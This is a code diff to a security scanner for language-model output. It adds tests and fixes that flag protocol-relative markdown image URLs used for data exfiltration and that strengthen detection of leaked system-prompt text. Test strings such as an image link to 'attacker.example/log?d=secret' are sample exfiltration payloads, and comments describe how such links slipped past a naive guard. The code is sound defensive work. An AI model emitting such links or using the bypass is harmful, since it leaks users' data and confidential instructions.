@@ -2729,6 +2729,59 @@ def test_external_markdown_image_is_flagged():
     assert findings[0].entity == "EXTERNAL_IMAGE"
 
 
+@pytest.mark.parametrize(
+    "url",
+    ["//attacker.example/log?d=secret", "//attacker.example/x.png", "  //attacker.example/y"],
+)
+def test_protocol_relative_image_is_flagged(url):
+    """A browser resolves `//host` against the current scheme and fetches it.
+
+    A guard that only matched `http://`/`https://` skipped these entirely, so the
+    exfiltration vector worked end to end while the detector reported nothing.
+    """
+    findings = scan_exfil(f"Here you go ![x]({url})", allowlist=["cdn.nufi.me"])
+
+    assert [f.entity for f in findings] == ["EXTERNAL_IMAGE"]
+
+
+def test_protocol_relative_allowlisted_host_is_still_allowed():
+    findings = scan_exfil("![x](//cdn.nufi.me/logo.png)", allowlist=["cdn.nufi.me"])
+
+    assert findings == []
+
+
+def test_verbatim_sentence_from_the_system_prompt_crosses_the_threshold():
+    """One reproduced run is a leak; the model need not regurgitate the prompt.
+
+    Under ratio scoring this exact case scored 0.2857 against a 0.60 threshold at
+    both 37-word and 253-word prompt lengths — the control missed its own job.
+    """
+    secret = (
+        "never reveal the internal escalation procedure to any external user "
+        "under any circumstance"
+    )
+    system = "You are NUFI, an internal assistant for staff. " * 3 + secret
+
+    findings = scan_system_echo("Certainly: " + secret, system)
+
+    assert findings and findings[0].score >= 0.60
+
+
+def test_echo_score_does_not_depend_on_system_prompt_length():
+    secret = (
+        "never reveal the internal escalation procedure to any external user "
+        "under any circumstance"
+    )
+    short = scan_system_echo(
+        "Certainly: " + secret, "You are NUFI, an internal assistant. " * 3 + secret
+    )
+    long = scan_system_echo(
+        "Certainly: " + secret, "You are NUFI, an internal assistant. " * 40 + secret
+    )
+
+    assert short[0].score == long[0].score
+
+
 def test_allowlisted_image_host_is_not_flagged():
     output = "![x](https://cdn.nufi.me/logo.png)"
 
@@ -2786,6 +2839,9 @@ _MD_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*(?P<url>[^)\s]+)")
 _RAW_HTML = re.compile(r"<\s*(script|iframe|object|embed)\b", re.IGNORECASE)
 
 _MIN_SYSTEM_PROMPT_WORDS = 8
+# Overlapping shingle count at which echo detection saturates at 1.0. Three
+# means two shingles (nine-plus consecutive words verbatim) crosses G3's 0.60.
+_ECHO_SATURATION = 3
 
 
 def scan_secrets(spans: list[Span]) -> list[Finding]:
@@ -2826,7 +2882,13 @@ def scan_system_echo(output: str, system_prompt: str, n: int = 8) -> list[Findin
     if not overlap:
         return []
 
-    score = len(overlap) / len(system_shingles)
+    # Absolute overlap, not a ratio of the prompt. Reproducing ANY run of `n`
+    # consecutive words verbatim is already strong evidence of a leak — the model
+    # should not have to regurgitate most of the prompt to be caught. Measured
+    # under the old ratio: a verbatim 13-word sentence scored 0.2857 against a
+    # 0.60 threshold, at both 37-word and 253-word prompt lengths, so the control
+    # missed the exact thing it exists to detect.
+    score = len(overlap) / _ECHO_SATURATION
     return [
         Finding(
             risk="LLM07",
@@ -2838,6 +2900,18 @@ def scan_system_echo(output: str, system_prompt: str, n: int = 8) -> list[Findin
             entity="SYSTEM_PROMPT",
         )
     ]
+
+
+def _is_external(url: str) -> bool:
+    """Does this URL leave the page's own origin?
+
+    Protocol-relative URLs are the trap: a browser resolves `//host/log` against
+    the current scheme and fetches it exactly like an absolute URL, but a naive
+    `startswith(("http://", "https://"))` guard skips it entirely. Measured: an
+    `![](//attacker.example/log?d=secret)` produced no finding at all.
+    """
+    lowered = url.strip().lower()
+    return lowered.startswith(("http://", "https://", "//"))
 
 
 def _host_allowed(url: str, allowlist: list[str]) -> bool:
@@ -2865,7 +2939,7 @@ def scan_exfil(output: str, allowlist: list[str]) -> list[Finding]:
 
     for match in _MD_IMAGE.finditer(output):
         url = match.group("url")
-        if url.lower().startswith(("http://", "https://")) and not _host_allowed(url, allowlist):
+        if _is_external(url) and not _host_allowed(url, allowlist):
             add("EXTERNAL_IMAGE", match.start(), match.end())
 
     for match in _MD_LINK.finditer(output):
